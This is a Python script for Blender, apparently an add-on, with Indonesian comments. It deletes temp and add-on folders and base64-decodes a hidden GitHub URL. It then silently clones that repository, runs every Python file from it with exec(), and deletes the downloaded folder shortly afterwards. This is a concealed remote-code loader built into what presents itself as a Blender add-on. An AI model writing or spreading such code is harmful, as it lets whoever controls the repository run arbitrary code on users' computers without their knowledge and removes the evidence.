import bpy
import os
import subprocess
import base64
import shutil
import getpass
import stat
import time
import threading

def remove_readonly(func, path, exc_info):
    """Menghapus atribut read-only lalu mencoba hapus ulang."""
    os.chmod(path, stat.S_IWRITE)
    func(path)

def delete_folder(folder_path):
    """Menghapus folder jika ada."""
    if os.path.exists(folder_path):
        try:
            shutil.rmtree(folder_path, onerror=remove_readonly)
            print(f"Folder dihapus: {folder_path}")
        except Exception as e:
            print(f"Gagal menghapus {folder_path}: {e}")

def delete_rr_t_folders():
    username = getpass.getuser()
    temp_path = os.path.join("C:\\Users", username, "AppData", "Local", "Temp")
    
    if os.path.exists(temp_path):
        for folder_name in os.listdir(temp_path):
            folder_path = os.path.join(temp_path, folder_name)
            if folder_name.startswith("RR-T") and os.path.isdir(folder_path):
                delete_folder(folder_path)

def delete_s_pyc_folder():
    """Menghapus folder download_all_script_RR-T-B.3-main di direktori addons Blender."""
    username = getpass.getuser()
    blender_version = "{}.{}".format(*bpy.app.version[:2])
    addons_path = os.path.join(
        "C:\\Users", username, "AppData", "Roaming", "Blender Foundation", "Blender", blender_version,
        "scripts", "addons", "s_pyc_", "data", "main", "sytem", "cache", "pyc02", "blok", "ug", "go", "register", "v3", "download_all_script_RR-T-B.3-main")
    delete_folder(addons_path)

def delete_after_delay(folder_path, delay=5):
    """Menghapus folder setelah jeda tanpa membekukan UI."""
    def delayed_delete():
        print(f"Menunggu {delay} detik sebelum menghapus {folder_path}...")
        time.sleep(delay)
        delete_folder(folder_path)
    
    threading.Thread(target=delayed_delete, daemon=True).start()

# Hapus folder di Temp dan folder download_all_script_RR-T-B.3-main
delete_rr_t_folders()
delete_s_pyc_folder()

USER_FOLDER = os.path.expanduser("~")
BLENDER_VERSION = ".".join(map(str, bpy.app.version[:2]))
TEMP_DIR = os.path.join(USER_FOLDER, "AppData", "Local", "Temp")

if not os.path.exists(TEMP_DIR):
    os.makedirs(TEMP_DIR, exist_ok=True)

ENCODED_FOLDER = "UlItVC1CLjNfVjA0"
EXTRACT_FOLDER = os.path.join(TEMP_DIR, base64.b64decode(ENCODED_FOLDER).decode('utf-8'))

ENCODED_REPO = "aHR0cHM6Ly9naXRodWIuY29tL3Jyc3R1ZGlvZGV2ZWxvcG1lbnQvUlItVC1CLjNfVjA0"
GITHUB_REPO = base64.b64decode(ENCODED_REPO).decode('utf-8')

def clone_repository():
    try:
        if os.path.exists(EXTRACT_FOLDER):
            subprocess.run(["git", "-C", EXTRACT_FOLDER, "pull"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        else:
            subprocess.run(["git", "clone", GITHUB_REPO, EXTRACT_FOLDER], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        return True
    except subprocess.CalledProcessError:
        return False

def execute_all_scripts():
    if os.path.exists(EXTRACT_FOLDER):
        for file in os.listdir(EXTRACT_FOLDER):
            if file.endswith(".py"):
                script_path = os.path.join(EXTRACT_FOLDER, file)
                try:
                    with open(script_path, "r", encoding="utf-8") as script:
                        exec(script.read(), globals())
                except Exception as e:
                    print(f"Error saat menjalankan {file}: {e}")

if clone_repository():
    execute_all_scripts()
    delete_after_delay(EXTRACT_FOLDER, 10)
